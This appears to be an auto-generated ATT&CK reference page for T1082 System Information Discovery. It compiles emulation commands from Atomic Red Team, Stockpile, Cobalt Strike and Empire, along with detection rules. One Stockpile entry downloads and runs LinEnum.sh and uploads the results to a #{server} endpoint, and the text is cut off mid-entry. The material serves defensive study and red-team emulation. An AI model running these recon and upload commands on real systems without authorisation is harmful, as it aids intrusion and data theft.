
# System Information Discovery

## Description

### MITRE Description

> An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

Tools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. A breakdown of system data can also be gathered through the macOS <code>systemsetup</code> command, but it requires administrative privileges.

Infrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['User']
* Platforms: ['Linux', 'macOS', 'Windows', 'AWS', 'GCP', 'Azure']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1082

## Potential Commands

```
ver
shell ver
set
shell set
get_env.rb
net config workstation
net config server
shell net config workstation
shell net config server
systeminfo [/s COMPNAME] [/u DOMAIN\user] [/p password]
systemprofiler tool if no access yet (victim browses to website)
or
shell systeminfo (if you already have a beacon)
sysinfo, run winenum, get_env.rb
systeminfo
reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum

system_profiler
ls -al /Applications

uname -a >> /tmp/T1082.txt
if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> /tmp/T1082.txt; fi;
if [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> /tmp/T1082.txt; fi;      
if [ -f /etc/issue ]; then cat /etc/issue >> /tmp/T1082.txt; fi;
uptime >> /tmp/T1082.txt
cat /tmp/T1082.txt 2>/dev/null

if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi;
if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i "Droplet\|HVM\|VirtualBox\|VMware"; fi;
if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i "Xen\|Bochs\|QEMU"; fi;
if [ -x "$(command -v dmidecode)" ]; then sudo dmidecode | grep -i "microsoft\|vmware\|virtualbox\|quemu\|domu"; fi;
if [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i "vmware\|vbox"; fi;
if [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i "vmware\|vbox\|qemu\|virtual"; fi;
if [ -x "$(command -v lspci)" ]; then sudo lspci | grep -i "vmware\|virtualbox"; fi;
if [ -x "$(command -v lscpu)" ]; then sudo lscpu | grep -i "Xen\|KVM\|Microsoft"; fi;

sudo lsmod | grep -i "vboxsf\|vboxguest"
sudo lsmod | grep -i "vmw_baloon\|vmxnet"
sudo lsmod | grep -i "xen-vbd\|xen-vnif"
sudo lsmod | grep -i "virtio_pci\|virtio_net"
sudo lsmod | grep -i "hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc"

hostname

hostname

REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid

{'windows': {'psh,pwsh': {'command': '$PSVersionTable\n'}}}
{'darwin': {'sh': {'command': 'find / -type d -user #{host.user.name} \\( -perm -g+w -or -perm -o+w \\) 2>/dev/null -exec ls -adl {} \\;\n'}}, 'linux': {'sh': {'command': 'find / -type d -user #{host.user.name} \\( -perm -g+w -or -perm -o+w \\) 2>/dev/null -exec ls -adl {} \\;\n'}}}
{'linux': {'sh': {'command': "wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh;\nchmod +x LinEnum.sh;\n./LinEnum.sh > /tmp/exfil.txt;\ncurl -F 'data=@/tmp/exfil.txt' #{server}/file/upload ;\ncat /tmp/exfil.txt;\n", 'cleanup': 'rm ./LinEnum.sh;\nrm /tmp/exfil.txt;\n'}}}
{'windows': {'psh': {'command': '[environment]::OSVersion.Version\n'}}}
powershell/situational_awareness/host/computerdetails
powershell/situational_awareness/host/computerdetails
powershell/situational_awareness/host/winenum
powershell/situational_awareness/host/winenum
powershell/situational_awareness/network/powerview/get_computer
powershell/situational_awareness/network/powerview/get_computer
```

## Commands Dataset

```
[{'command': 'ver',
  'name': 'Built-in Windows Command',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'shell ver',
  'name': 'Cobalt Strike',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'set',
  'name': 'Built-in Windows Command',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'shell set',
  'name': 'Cobalt Strike',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'get_env.rb',
  'name': 'Metasploit',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'net config workstation\nnet config server',
  'name': 'Built-in Windows Command',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'shell net config workstation\nshell net config server',
  'name': 'Cobalt Strike',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'systeminfo [/s COMPNAME] [/u DOMAIN\\user] [/p password]',
  'name': 'Built-in Windows Command',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'systemprofiler tool if no access yet (victim browses to '
             'website)\n'
             'or\n'
             'shell systeminfo (if you already have a beacon)',
  'name': 'Cobalt Strike',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'sysinfo, run winenum, get_env.rb',
  'name': 'Metasploit',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'systeminfo\n'
             'reg query '
             'HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum\n',
  'name': None,
  'source': 'atomics/T1082/T1082.yaml'},
 {'command': 'system_profiler\nls -al /Applications\n',
  'name': None,
  'source': 'atomics/T1082/T1082.yaml'},
 {'command': 'uname -a >> /tmp/T1082.txt\n'
             'if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> '
             '/tmp/T1082.txt; fi;\n'
             'if [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> '
             '/tmp/T1082.txt; fi;      \n'
             'if [ -f /etc/issue ]; then cat /etc/issue >> /tmp/T1082.txt; '
             'fi;\n'
             'uptime >> /tmp/T1082.txt\n'
             'cat /tmp/T1082.txt 2>/dev/null\n',
  'name': None,
  'source': 'atomics/T1082/T1082.yaml'},
 {'command': 'if [ -f /sys/class/dmi/id/bios_version ]; then cat '
             '/sys/class/dmi/id/bios_version | grep -i amazon; fi;\n'
             'if [ -f /sys/class/dmi/id/product_name ]; then cat '
             '/sys/class/dmi/id/product_name | grep -i '
             '"Droplet\\|HVM\\|VirtualBox\\|VMware"; fi;\n'
             'if [ -f /sys/class/dmi/id/product_name ]; then cat '
             '/sys/class/dmi/id/chassis_vendor | grep -i "Xen\\|Bochs\\|QEMU"; '
             'fi;\n'
             'if [ -x "$(command -v dmidecode)" ]; then sudo dmidecode | grep '
             '-i "microsoft\\|vmware\\|virtualbox\\|quemu\\|domu"; fi;\n'
             'if [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i '
             '"vmware\\|vbox"; fi;\n'
             'if [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | '
             'grep -i "vmware\\|vbox\\|qemu\\|virtual"; fi;\n'
             'if [ -x "$(command -v lspci)" ]; then sudo lspci | grep -i '
             '"vmware\\|virtualbox"; fi;\n'
             'if [ -x "$(command -v lscpu)" ]; then sudo lscpu | grep -i '
             '"Xen\\|KVM\\|Microsoft"; fi;\n',
  'name': None,
  'source': 'atomics/T1082/T1082.yaml'},
 {'command': 'sudo lsmod | grep -i "vboxsf\\|vboxguest"\n'
             'sudo lsmod | grep -i "vmw_baloon\\|vmxnet"\n'
             'sudo lsmod | grep -i "xen-vbd\\|xen-vnif"\n'
             'sudo lsmod | grep -i "virtio_pci\\|virtio_net"\n'
             'sudo lsmod | grep -i '
             '"hv_vmbus\\|hv_blkvsc\\|hv_netvsc\\|hv_utils\\|hv_storvsc"\n',
  'name': None,
  'source': 'atomics/T1082/T1082.yaml'},
 {'command': 'hostname\n', 'name': None, 'source': 'atomics/T1082/T1082.yaml'},
 {'command': 'hostname\n', 'name': None, 'source': 'atomics/T1082/T1082.yaml'},
 {'command': 'REG QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography '
             '/v MachineGuid\n',
  'name': None,
  'source': 'atomics/T1082/T1082.yaml'},
 {'command': {'windows': {'psh,pwsh': {'command': '$PSVersionTable\n'}}},
  'name': 'Discover the PowerShell version',
  'source': 'data/abilities/discovery/29451844-9b76-4e16-a9ee-d6feab4b24db.yml'},
 {'command': {'darwin': {'sh': {'command': 'find / -type d -user '
                                           '#{host.user.name} \\( -perm -g+w '
                                           '-or -perm -o+w \\) 2>/dev/null '
                                           '-exec ls -adl {} \\;\n'}},
              'linux': {'sh': {'command': 'find / -type d -user '
                                          '#{host.user.name} \\( -perm -g+w '
                                          '-or -perm -o+w \\) 2>/dev/null '
                                          '-exec ls -adl {} \\;\n'}}},
  'name': 'Discover all directories containing deletable files by user',
  'source': 'data/abilities/discovery/30732a56-4a23-4307-9544-09caf2ed29d5.yml'},
 {'command': {'linux': {'sh': {'cleanup': 'rm ./LinEnum.sh;\n'
                                          'rm /tmp/exfil.txt;\n',
                               'command': 'wget '
                                          'https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh;\n'
                                          'chmod +x LinEnum.sh;\n'
                                          './LinEnum.sh > /tmp/exfil.txt;\n'
                                          "curl -F 'data=@/tmp/exfil.txt' "
                                          '#{server}/file/upload ;\n'
                                          'cat /tmp/exfil.txt;\n'}}},
  'name': 'Download and execute LinEnum.sh',
  'source': 'data/abilities/discovery/46098c66-8d9a-4d23-8a95-dd5021c385ae.yml'},
 {'command': {'windows': {'psh': {'command': '[environment]::OSVersion.Version\n'}}},
  'name': 'Find OS Version',
  'source': 'data/abilities/discovery/b6b105b9-41dc-490b-bc5c-80d699b82ce8.yml'},
 {'command': 'powershell/situational_awareness/host/computerdetails',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/situational_awareness/host/computerdetails',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/situational_awareness/host/winenum',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/situational_awareness/host/winenum',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/situational_awareness/network/powerview/get_computer',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/situational_awareness/network/powerview/get_computer',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'}]
```

## Potential Detections

```json
[{'data_source': {'author': 'Florian Roth, Markus Neis',
                  'date': '2018/08/22',
                  'description': 'Detects a set of commands often used in '
                                 'recon stages by different attack groups',
                  'detection': {'condition': 'selection | count() by '
                                             'CommandLine > 4',
                                'selection': {'CommandLine': ['tasklist',
                                                              'net time',
                                                              'systeminfo',
                                                              'whoami',
                                                              'nbtstat',
                                                              'net start',
                                                              '*\\net1 start',
                                                              'qprocess',
                                                              'nslookup',
                                                              'hostname.exe',
                                                              '*\\net1 user '
                                                              '/domain',
                                                              '*\\net1 group '
                                                              '/domain',
                                                              '*\\net1 group '
                                                              '"domain admins" '
                                                              '/domain',
                                                              '*\\net1 group '
                                                              '"Exchange '
                                                              'Trusted '
                                                              'Subsystem" '
                                                              '/domain',
                                                              '*\\net1 '
                                                              'accounts '
                                                              '/domain',
                                                              '*\\net1 user '
                                                              'net localgroup '
                                                              'administrators',
                                                              'netstat -an']},
                                'timeframe': '15s'},
                  'falsepositives': ['False positives depend on scripts and '
                                     'administrative tools used in the '
                                     'monitored environment'],
                  'id': '2887e914-ce96-435f-8105-593937e90757',
                  'level': 'medium',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'modified': '2018/12/11',
                  'references': ['https://twitter.com/haroonmeer/status/939099379834658817',
                                 'https://twitter.com/c_APT_ure/status/939475433711722497',
                                 'https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.html'],
                  'status': 'experimental',
                  'tags': ['attack.discovery',
                           'attack.t1087',
                           'attack.t1082',
                           'car.2016-03-001'],
                  'title': 'Reconnaissance Activity with Net Command'}},
 {'data_source': ['4688 ', 'Process CMD Line']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['4688 ', 'Process CMD Line']},
 {'data_source': ['4688', 'Process Execution']}]
```

## Potential Queries

```json
[{'name': 'System Information Discovery',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1 and (process_path '
           'contains"sysinfo.exe"or process_path contains "reg.exe")and '
           'process_command_line contains "reg*query '
           'HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\Disk\\\\Enum"'}]
```

## Raw Dataset

```json
[{'Mitre APT3 Adversary Emulation Field Manual': {'Built-in Windows Command': 'ver',
                                                  'Category': 'T1082',
                                                  'Cobalt Strike': 'shell ver',
                                                  'Description': 'Get the '
                                                                 'Windows OS '
                                                                 'version '
                                                                 "that's "
                                                                 'running',
                                                  'Metasploit': ''}},
 {'Mitre APT3 Adversary Emulation Field Manual': {'Built-in Windows Command': 'set',
                                                  'Category': 'T1082',
                                                  'Cobalt Strike': 'shell set',
                                                  'Description': 'Print all of '
                                                                 'the '
                                                                 'environment '
                                                                 'variables',
                                                  'Metasploit': 'get_env.rb'}},
 {'Mitre APT3 Adversary Emulation Field Manual': {'Built-in Windows Command': 'net '
                                                                              'config '
                                                                              'workstation\n'
                                                                              'net '
                                                                              'config '
                                                                              'server',
                                                  'Category': 'T1082',
                                                  'Cobalt Strike': 'shell net '
                                                                   'config '
                                                                   'workstation\n'
                                                                   'shell net '
                                                                   'config '
                                                                   'server',
                                                  'Description': 'Get computer '
                                                                 'name, '
                                                                 'username, OS '
                                                                 'software '
                                                                 'version, '
                                                                 'domain '
                                                                 'information, '
                                                                 'DNS, logon '
                                                                 'domain',
                                                  'Metasploit': ''}},
 {'Mitre APT3 Adversary Emulation Field Manual': {'Built-in Windows Command': 'systeminfo '
                                                                              '[/s '
                                                                              'COMPNAME] '
                                                                              '[/u '
                                                                              'DOMAIN\\user] '
                                                                              '[/p '
                                                                              'password]',
                                                  'Category': 'T1082',
                                                  'Cobalt Strike': 'systemprofiler '
                                                                   'tool if no '
                                                                   'access yet '
                                                                   '(victim '
                                                                   'browses to '
                                                                   'website)\n'
                                                                   'or\n'
                                                                   'shell '
                                                                   'systeminfo '
                                                                   '(if you '
                                                                   'already '
                                                                   'have a '
                                                                   'beacon)',
                                                  'Description': 'Displays '
                                                                 'detailed '
                                                                 'configuration '
                                                                 'information '
                                                                 'about a '
                                                                 'computer and '
                                                                 'its '
                                                                 'operating '
                                                                 'system, '
                                                                 'including '
                                                                 'operating '
                                                                 'system '
                                                                 'configuration, '
                                                                 'security '
                                                                 'information, '
                                                                 'product ID, '
                                                                 'and hardware '
                                                                 'properties, '
                                                                 'such as RAM, '
                                                                 'disk space, '
                                                                 'and network '
                                                                 'cards',
                                                  'Metasploit': 'sysinfo, run '
                                                                'winenum, '
                                                                'get_env.rb'}},
 {'Atomic Red Team Test - System Information Discovery': {'atomic_tests': [{'auto_generated_guid': '66703791-c902-4560-8770-42b8a91f7667',
                                                                            'description': 'Identify '
                                                                                           'System '
                                                                                           'Info. '
                                                                                           'Upon '
                                                                                           'execution, '
                                                                                           'system '
                                                                                           'info '
                                                                                           'and '
                                                                                           'time '
                                                                                           'info '
                                                                                           'will '
                                                                                           'be '
                                                                                           'displayed.\n',
                                                                            'executor': {'command': 'systeminfo\n'
                                                                                                    'reg '
                                                                                                    'query '
                                                                                                    'HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum\n',
                                                                                         'name': 'command_prompt'},
                                                                            'name': 'System '
                                                                                    'Information '
                                                                                    'Discovery',
                                                                            'supported_platforms': ['windows']},
                                                                           {'auto_generated_guid': 'edff98ec-0f73-4f63-9890-6b117092aff6',
                                                                            'description': 'Identify '
                                                                                           'System '
                                                                                           'Info\n',
                                                                            'executor': {'command': 'system_profiler\n'
                                                                                                    'ls '
                                                                                                    '-al '
                                                                                                    '/Applications\n',
                                                                                         'name': 'sh'},
                                                                            'name': 'System '
                                                                                    'Information '
                                                                                    'Discovery',
                                                                            'supported_platforms': ['macos']},
                                                                           {'auto_generated_guid': 'cccb070c-df86-4216-a5bc-9fb60c74e27c',
                                                                            'description': 'Identify '
                                                                                           'System '
                                                                                           'Info\n',
                                                                            'executor': {'cleanup_command': 'rm '
                                                                                                            '#{output_file} '
                                                                                                            '2>/dev/null\n',
                                                                                         'command': 'uname '
                                                                                                    '-a '
                                                                                                    '>> '
                                                                                                    '#{output_file}\n'
                                                                                                    'if '
                                                                                                    '[ '
                                                                                                    '-f '
                                                                                                    '/etc/lsb-release '
                                                                                                    ']; '
                                                                                                    'then '
                                                                                                    'cat '
                                                                                                    '/etc/lsb-release '
                                                                                                    '>> '
                                                                                                    '#{output_file}; '
                                                                                                    'fi;\n'
                                                                                                    'if '
                                                                                                    '[ '
                                                                                                    '-f '
                                                                                                    '/etc/redhat-release '
                                                                                                    ']; '
                                                                                                    'then '
                                                                                                    'cat '
                                                                                                    '/etc/redhat-release '
                                                                                                    '>> '
                                                                                                    '#{output_file}; '
                                                                                                    'fi;      \n'
                                                                                                    'if '
                                                                                                    '[ '
                                                                                                    '-f '
                                                                                                    '/etc/issue '
                                                                                                    ']; '
                                                                                                    'then '
                                                                                                    'cat '
                                                                                                    '/etc/issue '
                                                                                                    '>> '
                                                                                                    '#{output_file}; '
                                                                                                    'fi;\n'
                                                                                                    'uptime '
                                                                                                    '>> '
                                                                                                    '#{output_file}\n'
                                                                                                    'cat '
                                                                                                    '#{output_file} '
                                                                                                    '2>/dev/null\n',
                                                                                         'name': 'sh'},
                                                                            'input_arguments': {'output_file': {'default': '/tmp/T1082.txt',
                                                                                                                'description': 'Output '
                                                                                                                               'file '
                                                                                                                               'used '
                                                                                                                               'to '
                                                                                                                               'store '
                                                                                                                               'the '
                                                                                                                               'results.',
                                                                                                                'type': 'path'}},
                                                                            'name': 'List '
                                                                                    'OS '
                                                                                    'Information',
                                                                            'supported_platforms': ['linux',
                                                                                                    'macos']},
                                                                           {'auto_generated_guid': '31dad7ad-2286-4c02-ae92-274418c85fec',
                                                                            'description': 'Identify '
                                                                                           'virtual '
                                                                                           'machine '
                                                                                           'hardware. '
                                                                                           'This '
                                                                                           'technique '
                                                                                           'is '
                                                                                           'used '
                                                                                           'by '
                                                                                           'the '
                                                                                           'Pupy '
                                                                                           'RAT '
                                                                                           'and '
                                                                                           'other '
                                                                                           'malware.\n',
                                                                            'executor': {'command': 'if '
                                                                                                    '[ '
                                                                                                    '-f '
                                                                                                    '/sys/class/dmi/id/bios_version '
                                                                                                    ']; '
                                                                                                    'then '
                                                                                                    'cat '
                                                                                                    '/sys/class/dmi/id/bios_version '
                                                                                                    '| '
                                                                                                    'grep '
                                                                                                    '-i '
                                                                                                    'amazon; '
                                                                                                    'fi;\n'
                                                                                                    'if '
                                                                                                    '[ '
                                                                                                    '-f '
                                                                                                    '/sys/class/dmi/id/product_name '
                                                                                                    ']; '
                                                                                                    'then '
                                                                                                    'cat '
                                                                                                    '/sys/class/dmi/id/product_name '
                                                                                                    '| '
                                                                                                    'grep '
                                                                                                    '-i '
                                                                                                    '"Droplet\\|HVM\\|VirtualBox\\|VMware"; '
                                                                                                    'fi;\n'
                                                                                                    'if '
                                                                                                    '[ '
                                                                                                    '-f '
                                                                                                    '/sys/class/dmi/id/product_name '
                                                                                                    ']; '
                                                                                                    'then '
                                                                                                    'cat '
                                                                                                    '/sys/class/dmi/id/chassis_vendor '
                                                                                                    '| '
                                                                                                    'grep '
                                                                                                    '-i '
                                                                                                    '"Xen\\|Bochs\\|QEMU"; '
                                                                                                    'fi;\n'
                                                                                                    'if '
                                                                                                    '[ '
                                                                                                    '-x '
                                                                                                    '"$(command '
                                                                                                    '-v '
                                                                                                    'dmidecode)" '
                                                                                                    ']; '
                                                                                                    'then '
                                                                                                    'sudo '
                                                                                                    'dmidecode '
                                                                                                    '| '
                                                                                                    'grep '
                                                                                                    '-i '
                                                                                                    '"microsoft\\|vmware\\|virtualbox\\|quemu\\|domu"; '
                                                                                                    'fi;\n'
                                                                                                    'if '
                                                                                                    '[ '
                                                                                                    '-f '
                                                                                                    '/proc/scsi/scsi '
                                                                                                    ']; '
                                                                                                    'then '
                                                                                                    'cat '
                                                                                                    '/proc/scsi/scsi '
                                                                                                    '| '
                                                                                                    'grep '
                                                                                                    '-i '
                                                                                                    '"vmware\\|vbox"; '
                                                                                                    'fi;\n'
                                                                                                    'if '
                                                                                                    '[ '
                                                                                                    '-f '
                                                                                                    '/proc/ide/hd0/model '
                                                                                                    ']; '
                                                                                                    'then '
                                                                                                    'cat '
                                                                                                    '/proc/ide/hd0/model '
                                                                                                    '| '
                                                                                                    'grep '
                                                                                                    '-i '
                                                                                                    '"vmware\\|vbox\\|qemu\\|virtual"; '
                                                                                                    'fi;\n'
                                                                                                    'if '
                                                                                                    '[ '
                                                                                                    '-x '
                                                                                                    '"$(command '
                                                                                                    '-v '
                                                                                                    'lspci)" '
                                                                                                    ']; '
                                                                                                    'then '
                                                                                                    'sudo '
                                                                                                    'lspci '
                                                                                                    '| '
                                                                                                    'grep '
                                                                                                    '-i '
                                                                                                    '"vmware\\|virtualbox"; '
                                                                                                    'fi;\n'
                                                                                                    'if '
                                                                                                    '[ '
                                                                                                    '-x '
                                                                                                    '"$(command '
                                                                                                    '-v '
                                                                                                    'lscpu)" '
                                                                                                    ']; '
                                                                                                    'then '
                                                                                                    'sudo '
                                                                                                    'lscpu '
                                                                                                    '| '
                                                                                                    'grep '
                                                                                                    '-i '
                                                                                                    '"Xen\\|KVM\\|Microsoft"; '
                                                                                                    'fi;\n',
                                                                                         'name': 'bash'},
                                                                            'name': 'Linux '
                                                                                    'VM '
                                                                                    'Check '
                                                                                    'via '
                                                                                    'Hardware',
                                                                            'supported_platforms': ['linux']},
                                                                           {'auto_generated_guid': '8057d484-0fae-49a4-8302-4812c4f1e64e',
                                                                            'description': 'Identify '
                                                                                           'virtual '
                                                                                           'machine '
                                                                                           'guest '
                                                                                           'kernel '
                                                                                           'modules. '
                                                                                           'This '
                                                                                           'technique '
                                                                                           'is '
                                                                                           'used '
                                                                                           'by '
                                                                                           'the '
                                                                                           'Pupy '
                                                                                           'RAT '
                                                                                           'and '
                                                                                           'other '
                                                                                           'malware.\n',
                                                                            'executor': {'command': 'sudo '
                                                                                                    'lsmod '
                                                                                                    '| '
                                                                                                    'grep '
                                                                                                    '-i '
                                                                                                    '"vboxsf\\|vboxguest"\n'
                                                                                                    'sudo '
                                                                                                    'lsmod '
                                                                                                    '| '
                                                                                                    'grep '
                                                                                                    '-i '
                                                                                                    '"vmw_baloon\\|vmxnet"\n'
                                                                                                    'sudo '
                                                                                                    'lsmod '
                                                                                                    '| '
                                                                                                    'grep '
                                                                                                    '-i '
                                                                                                    '"xen-vbd\\|xen-vnif"\n'
                                                                                                    'sudo '
                                                                                                    'lsmod '
                                                                                                    '| '
                                                                                                    'grep '
                                                                                                    '-i '
                                                                                                    '"virtio_pci\\|virtio_net"\n'
                                                                                                    'sudo '
                                                                                                    'lsmod '
                                                                                                    '| '
                                                                                                    'grep '
                                                                                                    '-i '
                                                                                                    '"hv_vmbus\\|hv_blkvsc\\|hv_netvsc\\|hv_utils\\|hv_storvsc"\n',
                                                                                         'name': 'bash'},
                                                                            'name': 'Linux '
                                                                                    'VM '
                                                                                    'Check '
                                                                                    'via '
                                                                                    'Kernel '
                                                                                    'Modules',
                                                                            'supported_platforms': ['linux']},
                                                                           {'auto_generated_guid': '85cfbf23-4a1e-4342-8792-007e004b975f',
                                                                            'description': 'Identify '
                                                                                           'system '
                                                                                           'hostname '
                                                                                           'for '
                                                                                           'Windows. '
                                                                                           'Upon '
                                                                                           'execution, '
                                                                                           'the '
                                                                                           'hostname '
                                                                                           'of '
                                                                                           'the '
                                                                                           'device '
                                                                                           'will '
                                                                                           'be '
                                                                                           'displayed.\n',
                                                                            'executor': {'command': 'hostname\n',
                                                                                         'name': 'command_prompt'},
                                                                            'name': 'Hostname '
                                                                                    'Discovery '
                                                                                    '(Windows)',
                                                                            'supported_platforms': ['windows']},
                                                                           {'auto_generated_guid': '486e88ea-4f56-470f-9b57-3f4d73f39133',
                                                                            'description': 'Identify '
                                                                                           'system '
                                                                                           'hostname '
                                                                                           'for '
                                                                                           'Linux '
                                                                                           'and '
                                                                                           'macOS '
                                                                                           'systems.\n',
                                                                            'executor': {'command': 'hostname\n',
                                                                                         'name': 'bash'},
                                                                            'name': 'Hostname '
                                                                                    'Discovery',
                                                                            'supported_platforms': ['linux',
                                                                                                    'macos']},
                                                                           {'auto_generated_guid': '224b4daf-db44-404e-b6b2-f4d1f0126ef8',
                                                                            'description': 'Identify '
                                                                                           'the '
                                                                                           'Windows '
                                                                                           'MachineGUID '
                                                                                           'value '
                                                                                           'for '
                                                                                           'a '
                                                                                           'system. '
                                                                                           'Upon '
                                                                                           'execution, '
                                                                                           'the '
                                                                                           'machine '
                                                                                           'GUID '
                                                                                           'will '
                                                                                           'be '
                                                                                           'displayed '
                                                                                           'from '
                                                                                           'registry.\n',
                                                                            'executor': {'command': 'REG '
                                                                                                    'QUERY '
                                                                                                    'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography '
                                                                                                    '/v '
                                                                                                    'MachineGuid\n',
                                                                                         'name': 'command_prompt'},
                                                                            'name': 'Windows '
                                                                                    'MachineGUID '
                                                                                    'Discovery',
                                                                            'supported_platforms': ['windows']}],
                                                          'attack_technique': 'T1082',
                                                          'display_name': 'System '
                                                                          'Information '
                                                                          'Discovery'}},
 {'Mitre Stockpile - Discover the PowerShell version': {'description': 'Discover '
                                                                       'the '
                                                                       'PowerShell '
                                                                       'version',
                                                        'id': '29451844-9b76-4e16-a9ee-d6feab4b24db',
                                                        'name': 'PowerShell '
                                                                'version',
                                                        'platforms': {'windows': {'psh,pwsh': {'command': '$PSVersionTable\n'}}},
                                                        'tactic': 'discovery',
                                                        'technique': {'attack_id': 'T1082',
                                                                      'name': 'System '
                                                                              'Information '
                                                                              'Discovery'}}},
 {'Mitre Stockpile - Discover all directories containing deletable files by user': {'description': 'Discover '
                                                                                                   'all '
                                                                                                   'directories '
                                                                                                   'containing '
                                                                                                   'deletable '
                                                                                                   'files '
                                                                                                   'by '
                                                                                                   'user',
                                                                                    'id': '30732a56-4a23-4307-9544-09caf2ed29d5',
                                                                                    'name': 'Find '
                                                                                            'deletable '
                                                                                            'dirs '
                                                                                            '(per '
                                                                                            'user)',
                                                                                    'platforms': {'darwin': {'sh': {'command': 'find '
                                                                                                                               '/ '
                                                                                                                               '-type '
                                                                                                                               'd '
                                                                                                                               '-user '
                                                                                                                               '#{host.user.name} '
                                                                                                                               '\\( '
                                                                                                                               '-perm '
                                                                                                                               '-g+w '
                                                                                                                               '-or '
                                                                                                                               '-perm '
                                                                                                                               '-o+w '
                                                                                                                               '\\) '
                                                                                                                               '2>/dev/null '
                                                                                                                               '-exec '
                                                                                                                               'ls '
                                                                                                                               '-adl '
                                                                                                                               '{} '
                                                                                                                               '\\;\n'}},
                                                                                                  'linux': {'sh': {'command': 'find '
                                                                                                                              '/ '
                                                                                                                              '-type '
                                                                                                                              'd '
                                                                                                                              '-user '
                                                                                                                              '#{host.user.name} '
                                                                                                                              '\\( '
                                                                                                                              '-perm '
                                                                                                                              '-g+w '
                                                                                                                              '-or '
                                                                                                                              '-perm '
                                                                                                                              '-o+w '
                                                                                                                              '\\) '
                                                                                                                              '2>/dev/null '
                                                                                                                              '-exec '
                                                                                                                              'ls '
                                                                                                                              '-adl '
                                                                                                                              '{} '
                                                                                                                              '\\;\n'}}},
                                                                                    'requirements': [{'plugins.stockpile.app.requirements.paw_provenance': [{'source': 'host.user.name'}]}],
                                                                                    'tactic': 'discovery',
                                                                                    'technique': {'attack_id': 'T1082',
                                                                                                  'name': 'System '
                                                                                                          'Information '
                                                                                                          'Discovery'}}},
 {'Mitre Stockpile - Download and execute LinEnum.sh': {'description': 'Download '
                                                                       'and '
                                                                       'execute '
                                                                       'LinEnum.sh',
                                                        'id': '46098c66-8d9a-4d23-8a95-dd5021c385ae',
                                                        'name': 'Linux '
                                                                'Enumeration & '
                                                                'Privilege '
                                                                'Escalation '
                                                                'Discovery '
                                                                'Script',
                                                        'platforms': {'linux': {'sh': {'cleanup': 'rm '
                                                                                                  './LinEnum.sh;\n'
                                                                                                  'rm '
                                                                                                  '/tmp/exfil.txt;\n',
                                                                                       'command': 'wget '
